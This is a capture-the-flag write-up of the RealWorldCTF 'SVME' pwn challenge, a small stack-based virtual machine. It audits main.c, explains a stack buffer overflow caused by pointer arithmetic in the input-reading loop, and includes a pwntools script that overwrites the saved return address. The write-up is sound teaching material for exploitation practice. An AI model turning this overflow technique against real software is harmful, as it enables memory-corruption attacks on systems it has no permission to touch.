## RealWorldCTF - SVME [Pwn] ( 91 solves )
### Difficulty: baby
**Description**

Professor Terence Parr has taught us [how to build a virtual machine](https://www.slideshare.net/parrt/how-to-build-a-virtual-machine). Now it's time to break it!

## General overview
The SVME binary challenge is a simple implementation of a small virtual machine as presented in Prof. Terence Parr slides in the description of the challenge. We can send 512 bytes of bytecode to the virtual machine and the virtual machine will run all the instructions which we sent to it.

## Binary details
```
$ file svme
svme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=ac06c33f16248df7768fed3ecefb7e6a85ec5941, not stripped
```
Enabled protections:
```
$ checksec svme
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The provided libc is: `libc 2.31`

## Code audit
### `main.c`
```c
#include <stdbool.h>
#include <unistd.h>
#include "vm.h"

int main(int argc, char *argv[]) {
    int code[128], nread = 0;
    while (nread < sizeof(code)) {
        int ret = read(0, code+nread, sizeof(code)-nread);
        if (ret <= 0) break;
        nread += ret;
    }
    VM *vm = vm_create(code, nread/4, 0);
    vm_exec(vm, 0, true);
    vm_free(vm);
    return 0;
}
```
The very first thing I found was a buffer overflow in `main` while reading our input to the `code` buffer but actually I didn't use it at all for my exploit.
If an attacker sends exacly 128 bytes they will be copied to the `code` buffer and `nread` will be 128. But next time the attacker sends data to the program `code+nread` will cause a buffer overflow because the author does not realize that he is using pointer arithmetic and not simple addition to calculate where to write next to the `code` buffer. And if we carefully craft our payload we can bypass the stack canary too. Below is a simple example triggering the described buffer overflow:

```python3
from pwn import *
elf = context.binary = ELF('./svme_patched')
io = gdb.debug('./svme_patched')

# \x12 byte is telling the virtual machine to stop the execution of the program as soon as possible, so we are putting it first inorder to skip 
# the remainding payload that we are sending to avoid segfault in vm_exec function.
info('Skipping the stack canary!')
io.send(b'\x12'+b'\x00'*(128+3))

info('Buffer overflow!')
rbp = b'B'*8
rip = p64(0xdeadbeef)
padding = b'C'*400 # doesn't matter if we exceed 512 bytes the remaining bytes will be discarded.
io.send(rbp + rip + padding)

io.interactive()
```
